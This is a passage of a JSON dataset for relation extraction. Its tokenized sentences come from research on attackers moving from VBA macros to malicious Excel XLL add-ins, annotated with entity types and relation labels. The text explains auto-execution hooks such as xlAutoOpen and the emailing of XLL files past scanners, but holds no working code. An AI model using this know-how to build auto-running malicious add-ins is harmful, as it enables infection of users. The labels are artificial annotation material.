{"r": "WR", "evidence": [4, 5], "t": 10, "h": 12}, {"r": "FR", "evidence": [5, 6], "h": 12, "t": 13}, {"r": "EX", "evidence": [6], "h": 13, "t": 14}, {"r": "WR", "evidence": [6, 7], "h": 13, "t": 15}, {"r": "WR", "evidence": [6, 7], "h": 13, "t": 16}]}, {"title": "607-3", "sents": [["XLL", "in", "Windows", "Explorer", ",", "the", "shell", "will", "automatically", "attempt", "to", "launch", "Excel", "to", "open", "the", "."], ["Before", "an", "XLL", "file", "is", "loaded", ",", "Excel", "displays", "a", "warning", "about", "the", "possibility", "of", "malicious", "code", "being", "included", "."], ["Excel", "warning", "about", "a", "potential", "risk", "of", "opening", "an", "XLL", "fileXLL", "files", "can", "be", "sent", "by", "email", ",", "and", "even", "with", "the", "usual", "anti-malware", "scanning", "measures", ",", "users", "may", "be", "able", "to", "open", "them", "not", "knowing", "that", "they", "may", "contain", "malicious", "code", "."], ["In", "order", "to", "automatically", "launch", "code", ",", "malicious", "actors", "using", "Office", "documents", "would", "implement", "one", "or", "more", "event", "handling", "functions", "such", "as", "AutoOpen", ",", "AutoClose", ",", "Document_Open", "and", "Document_Close", "for", "Word", "or", "Worbook_Open", ",", "Workbook_Close", ",", "Auto_Open", ",", "Auto_Close", "for", "Excel", "."], ["Those", "functions", "would", "be", "called", "when", "a", "document", "is", "opened", ",", "closed", "or", "when", "the", "Office", "application", "fired", "an", "event", "handled", "by", "one", "of", "the", "implemented", "functions", "."], ["Using", "auto", "start", "functions", ",", "the", "attackers", "are", "able", "to", "launch", "their", "malicious", "macro", "code", "."], ["The", "intent", "of", "this", "research", "is", "to", "show", "whether", "attackers", "have", "transitioned", "from", "using", "malicious", "VBA", "macros", "to", "using", "XLLs", "as", "the", "infection", "vector", ",", "specifically", "after", "Microsoft", "'", "s", "announcement", "about", "blocking", "VBA", "macros", "."], ["The", "difference", "between", "a", "regular", "DLL", "and", "an", "XLL", "file", "is", "that", "XLLs", "can", "implement", "certain", "exported", "functions", "which", "will", "be", "called", "by", "the", "Excel", "Add-In", "manager", "during", "some", "events", "triggered", "by", "the", "Excel", "application", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [0, 0], "name": "XLL", "pos": [0, 1], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [6, 6], "name": "shell", "pos": [6, 7], "index": "1_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [12, 12], "name": "Excel", "pos": [12, 13], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [19, 19], "name": "XLL file", "pos": [2, 4], "index": "3_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [24, 24], "name": "Excel", "pos": [7, 8], "index": "4_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [37, 37], "name": "Excel", "pos": [0, 1], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [46, 46], "name": "XLL", "pos": [9, 10], "index": "6_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [53, 53], "name": "email", "pos": [16, 17], "index": "7_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [64, 64], "name": "users", "pos": [27, 28], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [88, 88], "name": "actors", "pos": [8, 9], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [90, 90], "name": "Office documents", "pos": [10, 12], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [129, 129], "name": "document", "pos": [7, 8], "index": "11_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [137, 137], "name": "Office application", "pos": [15, 17], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [156, 156], "name": "attackers", "pos": [6, 7], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [164, 164], "name": "code", "pos": [14, 15], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [181, 181], "name": "VBA macros", "pos": [15, 17], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [185, 185], "name": "XLLs", "pos": [19, 20], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [207, 207], "name": "DLL", "pos": [5, 6], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [210, 210], "name": "XLL file", "pos": [8, 10], "index": "18_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [214, 214], "name": "XLLs", "pos": [12, 13], "index": "19_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [226, 226], "name": "Excel Add-In manager", "pos": [24, 27], "index": "20_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [235, 235], "name": "Excel", "pos": [33, 34], "index": "21_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 1, "t": 2}, {"r": "EX", "evidence": [0], "t": 0, "h": 2}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "CO", "evidence": [0, 1], "h": 2, "t": 4}, {"r": "CO", "evidence": [0, 1, 2], "h": 2, "t": 5}, {"r": "WR", "evidence": [2], "t": 6, "h": 8}, {"r": "ST", "evidence": [2], "t": 7, "h": 8}, {"r": "RF", "evidence": [2], "t": 7, "h": 8}, {"r": "FR", "evidence": [2, 3], "h": 8, "t": 9}, {"r": "FR", "evidence": [3, 4], "h": 9, "t": 12}, {"r": "CO", "evidence": [3, 4], "h": 10, "t": 11}, {"r": "CO", "evidence": [3, 4, 5], "h": 10, "t": 14}, {"r": "WR", "evidence": [3, 4], "t": 10, "h": 12}, {"r": "FR", "evidence": [4, 5], "h": 12, "t": 13}, {"r": "EX", "evidence": [5], "h": 13, "t": 14}, {"r": "WR", "evidence": [5, 6], "h": 13, "t": 15}, {"r": "WR", "evidence": [5, 6], "h": 13, "t": 16}, {"r": "WR", "evidence": [5, 6, 7], "h": 13, "t": 17}, {"r": "CO", "evidence": [6, 7], "h": 16, "t": 19}, {"r": "WR", "evidence": [6, 7], "t": 15, "h": 20}, {"r": "WR", "evidence": [7], "t": 17, "h": 20}, {"r": "EX", "evidence": [7], "t": 19, "h": 20}, {"r": "CO", "evidence": [7], "h": 20, "t": 21}]}, {"title": "607-4", "sents": [["Before", "an", "XLL", "file", "is", "loaded", ",", "Excel", "displays", "a", "warning", "about", "the", "possibility", "of", "malicious", "code", "being", "included", "."], ["Excel", "warning", "about", "a", "potential", "risk", "of", "opening", "an", "XLL", "fileXLL", "files", "can", "be", "sent", "by", "email", ",", "and", "even", "with", "the", "usual", "anti-malware", "scanning", "measures", ",", "users", "may", "be", "able", "to", "open", "them", "not", "knowing", "that", "they", "may", "contain", "malicious", "code", "."], ["In", "order", "to", "automatically", "launch", "code", ",", "malicious", "actors", "using", "Office", "documents", "would", "implement", "one", "or", "more", "event", "handling", "functions", "such", "as", "AutoOpen", ",", "AutoClose", ",", "Document_Open", "and", "Document_Close", "for", "Word", "or", "Worbook_Open", ",", "Workbook_Close", ",", "Auto_Open", ",", "Auto_Close", "for", "Excel", "."], ["Those", "functions", "would", "be", "called", "when", "a", "document", "is", "opened", ",", "closed", "or", "when", "the", "Office", "application", "fired", "an", "event", "handled", "by", "one", "of", "the", "implemented", "functions", "."], ["Using", "auto", "start", "functions", ",", "the", "attackers", "are", "able", "to", "launch", "their", "malicious", "macro", "code", "."], ["The", "intent", "of", "this", "research", "is", "to", "show", "whether", "attackers", "have", "transitioned", "from", "using", "malicious", "VBA", "macros", "to", "using", "XLLs", "as", "the", "infection", "vector", ",", "specifically", "after", "Microsoft", "'", "s", "announcement", "about", "blocking", "VBA", "macros", "."], ["The", "difference", "between", "a", "regular", "DLL", "and", "an", "XLL", "file", "is", "that", "XLLs", "can", "implement", "certain", "exported", "functions", "which", "will", "be", "called", "by", "the", "Excel", "Add-In", "manager", "during", "some", "events", "triggered", "by", "the", "Excel", "application", "."], ["In", "order", "for", "an", "XLL", "add-in", "to", "be", "successfully", "loaded", "by", "the", "add-in", "manager", ",", "the", "XLL", "has", "to", "implement", "at", "least", "one", "exported", "function", ",", "called", "xlAutoOpen", ",", "in", "order", "for", "the", "add-in", "code", "to", "be", "called", "when", "the", "add-in", "is", "loaded", "by", "Excel", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [2, 2], "name": "XLL file", "pos": [2, 4], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [7, 7], "name": "Excel", "pos": [7, 8], "index": "1_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [20, 20], "name": "Excel", "pos": [0, 1], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [29, 29], "name": "XLL", "pos": [9, 10], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [36, 36], "name": "email", "pos": [16, 17], "index": "4_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [47, 47], "name": "users", "pos": [27, 28], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [71, 71], "name": "actors", "pos": [8, 9], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [73, 73], "name": "Office documents", "pos": [10, 12], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [112, 112], "name": "document", "pos": [7, 8], "index": "8_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [120, 120], "name": "Office application", "pos": [15, 17], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [139, 139], "name": "attackers", "pos": [6, 7], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [147, 147], "name": "code", "pos": [14, 15], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [164, 164], "name": "VBA macros", "pos": [15, 17], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [168, 168], "name": "XLLs", "pos": [19, 20], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [190, 190], "name": "DLL", "pos": [5, 6], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [193, 193], "name": "XLL file", "pos": [8, 10], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [197, 197], "name": "XLLs", "pos": [12, 13], "index": "16_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [209, 209], "name": "Excel Add-In manager", "pos": [24, 27], "index": "17_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [218, 218], "name": "Excel", "pos": [33, 34], "index": "18_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [225, 225], "name": "XLL add-in", "pos": [4, 6], "index": "19_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [233, 233], "name": "add-in manager", "pos": [12, 14], "index": "20_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [237, 237], "name": "XLL", "pos": [16, 17], "index": "21_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [261, 261], "name": "add-in", "pos": [40, 41], "index": "22_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [265, 265], "name": "Excel", "pos": [44, 45], "index": "23_0"}]], "labels": [{"r": "WR", "evidence": [1], "t": 3, "h": 5}, {"r": "ST", "evidence": [1], "t": 4, "h": 5}, {"r": "RF", "evidence": [1], "t": 4, "h": 5}, {"r": "FR", "evidence": [1, 2], "h": 5, "t": 6}, {"r": "FR", "evidence": [2, 3], "h": 6, "t": 9}, {"r": "CO", "evidence": [2, 3], "h": 7, "t": 8}, {"r": "CO", "evidence": [2, 3, 4], "h": 7, "t": 11}, {"r": "WR", "evidence": [2, 3], "t": 7, "h": 9}, {"r": "FR", "evidence": [3, 4], "h": 9, "t": 10}, {"r": "EX", "evidence": [4], "h": 10, "t": 11}, {"r": "WR", "evidence": [4, 5], "h": 10, "t": 12}, {"r": "WR", "evidence": [4, 5], "h": 10, "t": 13}, {"r": "WR", "evidence": [4, 5, 6], "h": 10, "t": 14}, {"r": "CO", "evidence": [5, 6], "h": 13, "t": 16}, {"r": "WR", "evidence": [5, 6], "t": 12, "h": 17}, {"r": "WR", "evidence": [6], "t": 14, "h": 17}, {"r": "EX", "evidence": [6], "t": 16, "h": 17}, {"r": "CO", "evidence": [6], "h": 17, "t": 18}, {"r": "EX", "evidence": [7], "t": 19, "h": 20}, {"r": "CO", "evidence": [7], "h": 21, "t": 22}, {"r": "CO", "evidence": [7], "t": 19, "h": 21}, {"r": "CO", "evidence": [7], "h": 20, "t": 23}]}, {"title": "607-5", "sents": [["Excel", "warning", "about", "a", "potential", "risk", "of", "opening", "an", "XLL", "fileXLL", "files", "can", "be", "sent", "by", "email", ",", "and", "even", "with", "the", "usual", "anti-malware", "scanning", "measures", ",", "users", "may", "be", "able", "to", "open", "them", "not", "knowing", "that", "they", "may", "contain", "malicious", "code", "."], ["In", "order", "to", "automatically", "launch", "code", ",", "malicious", "actors", "using", "Office", "documents", "would", "implement", "one", "or", "more", "event", "handling", "functions", "such", "as", "AutoOpen", ",", "AutoClose", ",", "Document_Open", "and", "Document_Close", "for", "Word", "or", "Worbook_Open", ",", "Workbook_Close", ",", "Auto_Open", ",", "Auto_Close", "for", "Excel", "."], ["Those", "functions", "would", "be", "called", "when", "a", "document", "is", "opened", ",", "closed", "or", "when", "the", "Office", "application", "fired", "an", "event", "handled", "by", "one", "of", "the", "implemented", "functions", "."], ["Using", "auto", "start", "functions", ",", "the", "attackers", "are", "able", "to", "launch", "their", "malicious", "macro", "code", "."], ["The", "intent", "of", "this", "research", "is", "to", "show", "whether", "attackers", "have", "transitioned", "from", "using", "malicious", "VBA", "macros", "to", "using", "XLLs", "as", "the", "infection", "vector", ",", "specifically", "after", "Microsoft", "'", "s", "announcement", "about", "blocking", "VBA", "macros", "."], ["The", "difference", "between", "a", "regular", "DLL", "and", "an", "XLL", "file", "is", "that", "XLLs", "can", "implement", "certain", "exported", "functions", "which", "will", "be", "called", "by", "the", "Excel", "Add-In", "manager", "during", "some", "events", "triggered", "by", "the", "Excel", "application", "."], ["In", "order", "for", "an", "XLL", "add-in", "to", "be", "successfully", "loaded", "by", "the", "add-in", "manager", ",", "the", "XLL", "has", "to", "implement", "at", "least", "one", "exported", "function", ",", "called", "xlAutoOpen", ",", "in", "order", "for", "the", "add-in", "code", "to", "be", "called", "when", "the", "add-in", "is", "loaded", "by", "Excel", "."], ["XLL", "exports", "and", "the", "events", "when", "they", "are", "calledThe", "Excel", "XLL", "SDK", "consists", "of", "C/C++", "header", "files", "and", "libraries", "that", "allow", "XLL", "files", "to", "utilize", "the", "Excel", "API", "to", "access", "workbooks", "data", "and", "call", "Excel", "functions", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [0, 0], "name": "Excel", "pos": [0, 1], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "XLL", "pos": [9, 10], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [16, 16], "name": "email", "pos": [16, 17], "index": "2_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [27, 27], "name": "users", "pos": [27, 28], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [51, 51], "name": "actors", "pos": [8, 9], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [53, 53], "name": "Office documents", "pos": [10, 12], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [92, 92], "name": "document", "pos": [7, 8], "index": "6_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [100, 100], "name": "Office application", "pos": [15, 17], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [119, 119], "name": "attackers", "pos": [6, 7], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [127, 127], "name": "code", "pos": [14, 15], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [144, 144], "name": "VBA macros", "pos": [15, 17], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [148, 148], "name": "XLLs", "pos": [19, 20], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [170, 170], "name": "DLL", "pos": [5, 6], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [173, 173], "name": "XLL file", "pos": [8, 10], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [177, 177], "name": "XLLs", "pos": [12, 13], "index": "14_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [189, 189], "name": "Excel Add-In manager", "pos": [24, 27], "index": "15_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [198, 198], "name": "Excel", "pos": [33, 34], "index": "16_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [205, 205], "name": "XLL add-in", "pos": [4, 6], "index": "17_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [213, 213], "name": "add-in manager", "pos": [12, 14], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [217, 217], "name": "XLL", "pos": [16, 17], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [241, 241], "name": "add-in", "pos": [40, 41], "index": "20_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [245, 245], "name": "Excel", "pos": [44, 45], "index": "21_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [257, 257], "name": "XLL", "pos": [10, 11], "index": "22_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [268, 268], "name": "XLL files", "pos": [21, 23], "index": "23_0"}]], "labels": [{"r": "WR", "evidence": [0], "t": 1, "h": 3}, {"r": "ST", "evidence": [0], "t": 2, "h": 3}, {"r": "RF", "evidence": [0], "t": 2, "h": 3}, {"r": "FR", "evidence": [0, 1], "h": 3, "t": 4}, {"r": "FR", "evidence": [1, 2], "h": 4, "t": 7}, {"r": "CO", "evidence": [1, 2], "h": 5, "t": 6}, {"r": "CO", "evidence": [1, 2, 3], "h": 5, "t": 9}, {"r": "WR", "evidence": [1, 2], "t": 5, "h": 7}, {"r": "FR", "evidence": [2, 3], "h": 7, "t": 8}, {"r": "EX", "evidence": [3], "h": 8, "t": 9}, {"r": "WR", "evidence": [3, 4], "h": 8, "t": 10}, {"r": "WR", "evidence": [3, 4], "h": 8, "t": 11}, {"r": "WR", "evidence": [3, 4, 5], "h": 8, "t": 12}, {"r": "CO", "evidence": [4, 5], "h": 11, "t": 14}, {"r": "WR", "evidence": [4, 5], "t": 10, "h": 15}, {"r": "WR", "evidence": [5], "t": 12, "h": 15}, {"r": "EX", "evidence": [5], "t": 14, "h": 15}, {"r": "CO", "evidence": [5], "h": 15, "t": 16}, {"r": "EX", "evidence": [6], "t": 17, "h": 18}, {"r": "CO", "evidence": [6], "h": 19, "t": 20}, {"r": "CO", "evidence": [6], "t": 17, "h": 19}, {"r": "CO", "evidence": [6, 7], "h": 19, "t": 23}, {"r": "CO", "evidence": [6, 7], "h": 19, "t": 22}, {"r": "CO", "evidence": [6], "h": 18, "t": 21}]}, {"title": "607-6", "sents": [["In", "order", "to", "automatically", "launch", "code", ",", "malicious", "actors", "using", "Office", "documents", "would", "implement", "one", "or", "more", "event", "handling", "functions", "such", "as", "AutoOpen", ",", "AutoClose", ",", "Document_Open", "and", "Document_Close", "for", "Word", "or", "Worbook_Open", ",", "Workbook_Close", ",", "Auto_Open", ",", "Auto_Close", "for", "Excel", "."], ["Those", "functions", "would", "be", "called", "when", "a", "document", "is", "opened", ",", "closed", "or", "when", "the", "Office", "application", "fired", "an", "event", "handled", "by", "one", "of", "the", "implemented", "functions", "."], ["Using", "auto", "start", "functions", ",", "the", "attackers", "are", "able", "to", "launch", "their", "malicious", "macro", "code", "."], ["The", "intent", "of", "this", "research", "is", "to", "show", "whether", "attackers", "have", "transitioned", "from", "using", "malicious", "VBA", "macros", "to", "using", "XLLs", "as", "the", "infection", "vector", ",", "specifically", "after", "Microsoft", "'", "s", "announcement", "about", "blocking", "VBA", "macros", "."], ["The", "difference", "between", "a", "regular", "DLL", "and", "an", "XLL", "file", "is", "that", "XLLs", "can", "implement", "certain", "exported", "functions", "which", "will", "be", "called", "by", "the", "Excel", "Add-In", "manager", "during", "some", "events", "triggered", "by", "the", "Excel", "application", "."], ["In", "order", "for", "an", "XLL", "add-in", "to", "be", "successfully", "loaded", "by", "the", "add-in", "manager", ",", "the", "XLL", "has", "to", "implement", "at", "least", "one", "exported", "function", ",", "called", "xlAutoOpen", ",", "in", "order", "for", "the", "add-in", "code", "to", "be", "called", "when", "the", "add-in", "is", "loaded", "by", "Excel", "."], ["XLL", "exports", "and", "the", "events", "when", "they", "are", "calledThe", "Excel", "XLL", "SDK", "consists", "of", "C/C++", "header", "files", "and", "libraries", "that", "allow", "XLL", "files", "to", "utilize", "the", "Excel", "API", "to", "access", "workbooks", "data", "and", "call", "Excel", "functions", "."], ["Most", "of", "the", "observed", "XLL", "malware", "samples", "are", "not", "created", "with", "the", "functionality", "to", "access", "Excel", "API", "but", "rather", "to", "execute", "its", "malicious", "code", "when", "the", "Excel", "Add-In", "manager", "calls", "xlAutoOpen", "or", "xlAutoClose", "functions", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [8, 8], "name": "actors", "pos": [8, 9], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [10, 10], "name": "Office documents", "pos": [10, 12], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [49, 49], "name": "document", "pos": [7, 8], "index": "2_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [57, 57], "name": "Office application", "pos": [15, 17], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [76, 76], "name": "attackers", "pos": [6, 7], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [84, 84], "name": "code", "pos": [14, 15], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [101, 101], "name": "VBA macros", "pos": [15, 17], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [105, 105], "name": "XLLs", "pos": [19, 20], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [127, 127], "name": "DLL", "pos": [5, 6], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [130, 130], "name": "XLL file", "pos": [8, 10], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [134, 134], "name": "XLLs", "pos": [12, 13], "index": "10_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [146, 146], "name": "Excel Add-In manager", "pos": [24, 27], "index": "11_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [155, 155], "name": "Excel", "pos": [33, 34], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [162, 162], "name": "XLL add-in", "pos": [4, 6], "index": "13_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [170, 170], "name": "add-in manager", "pos": [12, 14], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [174, 174], "name": "XLL", "pos": [16, 17], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [198, 198], "name": "add-in", "pos": [40, 41], "index": "16_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [202, 202], "name": "Excel", "pos": [44, 45], "index": "17_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [214, 214], "name": "XLL", "pos": [10, 11], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [225, 225], "name": "XLL files", "pos": [21, 23], "index": "19_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [245, 245], "name": "XLL malware samples", "pos": [4, 7], "index": "20_0"}]], "labels": [{"r": "FR", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "CO", "evidence": [0, 1, 2], "h": 1, "t": 5}, {"r": "WR", "evidence": [0, 1], "t": 1, "h": 3}, {"r": "FR", "evidence": [1, 2], "h": 3, "t": 4}, {"r": "EX", "evidence": [2], "h": 4, "t": 5}, {"r": "WR", "evidence": [2, 3], "h": 4, "t": 6}, {"r": "WR", "evidence": [2, 3], "h": 4, "t": 7}, {"r": "WR", "evidence": [2, 3, 4], "h": 4, "t": 8}, {"r": "CO", "evidence": [3, 4], "h": 7, "t": 10}, {"r": "WR", "evidence": [3, 4], "t": 6, "h": 11}, {"r": "WR", "evidence": [4], "t": 8, "h": 11}, {"r": "EX", "evidence": [4], "t": 10, "h": 11}, {"r": "CO", "evidence": [4], "h": 11, "t": 12}, {"r": "EX", "evidence": [5], "t": 13, "h": 14}, {"r": "CO", "evidence": [5], "h": 15, "t": 16}, {"r": "CO", "evidence": [5], "t": 13, "h": 15}, {"r": "CO", "evidence": [5, 6], "h": 15, "t": 19}, {"r": "CO", "evidence": [5, 6], "h": 15, "t": 18}, {"r": "CO", "evidence": [5, 6, 7], "h": 15, "t": 20}, {"r": "CO", "evidence": [5], "h": 14, "t": 17}]}, {"title": "607-7", "sents": [["Those", "functions", "would", "be", "called", "when", "a", "document", "is", "opened", ",", "closed", "or", "when", "the", "Office", "application", "fired", "an", "event", "handled", "by", "one", "of", "the", "implemented", "functions", "."], ["Using", "auto", "start", "functions", ",", "the", "attackers", "are", "able", "to", "launch", "their", "malicious", "macro", "code", "."], ["The", "intent", "of", "this", "research", "is", "to", "show", "whether", "attackers", "have", "transitioned", "from", "using", "malicious", "VBA", "macros", "to", "using", "XLLs", "as", "the", "infection", "vector", ",", "specifically", "after", "Microsoft", "'", "s", "announcement", "about", "blocking", "VBA", "macros", "."], ["The", "difference", "between", "a", "regular", "DLL", "and", "an", "XLL", "file", "is", "that", "XLLs", "can", "implement", "certain", "exported", "functions", "which", "will", "be", "called", "by", "the", "Excel", "Add-In", "manager", "during", "some", "events", "triggered", "by", "the", "Excel", "application", "."], ["In", "order", "for", "an", "XLL", "add-in", "to", "be", "successfully", "loaded", "by", "the", "add-in", "manager", ",", "the", "XLL", "has", "to", "implement", "at", "least", "one", "exported", "function", ",", "called", "xlAutoOpen", ",", "in", "order", "for", "the", "add-in", "code", "to", "be", "called", "when", "the", "add-in", "is", "loaded", "by", "Excel", "."], ["XLL", "exports", "and", "the", "events", "when", "they", "are", "calledThe", "Excel", "XLL", "SDK", "consists", "of", "C/C++", "header", "files", "and", "libraries", "that", "allow", "XLL", "files", "to", "utilize", "the", "Excel", "API", "to", "access", "workbooks", "data", "and", "call", "Excel", "functions", "."], ["Most", "of", "the", "observed", "XLL", "malware", "samples", "are", "not", "created", "with", "the", "functionality", "to", "access", "Excel", "API", "but", "rather", "to", "execute", "its", "malicious", "code", "when", "the", "Excel", "Add-In", "manager", "calls", "xlAutoOpen", "or", "xlAutoClose", "functions", "."], ["An", "XLL", "file", "written", "in", "a", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [7, 7], "name": "document", "pos": [7, 8], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [15, 15], "name": "Office application", "pos": [15, 17], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [34, 34], "name": "attackers", "pos": [6, 7], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [42, 42], "name": "code", "pos": [14, 15], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [59, 59], "name": "VBA macros", "pos": [15, 17], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [63, 63], "name": "XLLs", "pos": [19, 20], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [85, 85], "name": "DLL", "pos": [5, 6], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [88, 88], "name": "XLL file", "pos": [8, 10], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [92, 92], "name": "XLLs", "pos": [12, 13], "index": "8_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [104, 104], "name": "Excel Add-In manager", "pos": [24, 27], "index": "9_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [113, 113], "name": "Excel", "pos": [33, 34], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [120, 120], "name": "XLL add-in", "pos": [4, 6], "index": "11_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [128, 128], "name": "add-in manager", "pos": [12, 14], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [132, 132], "name": "XLL", "pos": [16, 17], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [156, 156], "name": "add-in", "pos": [40, 41], "index": "14_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [160, 160], "name": "Excel", "pos": [44, 45], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [172, 172], "name": "XLL", "pos": [10, 11], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [183, 183], "name": "XLL files", "pos": [21, 23], "index": "17_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [203, 203], "name": "XLL malware samples", "pos": [4, 7], "index": "18_0"}]], "labels": [{"r": "FR", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "EX", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [1, 2], "h": 2, "t": 4}, {"r": "WR", "evidence": [1, 2], "h": 2, "t": 5}, {"r": "WR", "evidence": [1, 2, 3], "h": 2, "t": 6}, {"r": "CO", "evidence": [2, 3], "h": 5, "t": 8}, {"r": "WR", "evidence": [2, 3], "t": 4, "h": 9}, {"r": "WR", "evidence": [3], "t": 6, "h": 9}, {"r": "EX", "evidence": [3], "t": 8, "h": 9}, {"r": "CO", "evidence": [3], "h": 9, "t": 10}, {"r": "EX", "evidence": [4], "t": 11, "h": 12}, {"r": "CO", "evidence": [4], "h": 13, "t": 14}, {"r": "CO", "evidence": [4], "t": 11, "h": 13}, {"r": "CO", "evidence": [4, 5], "h": 13, "t": 17}, {"r": "CO", "evidence": [4, 5], "h": 13, "t": 16}, {"r": "CO", "evidence": [4, 5, 6], "h": 13, "t": 18}, {"r": "CO", "evidence": [4], "h": 12, "t": 15}]}, 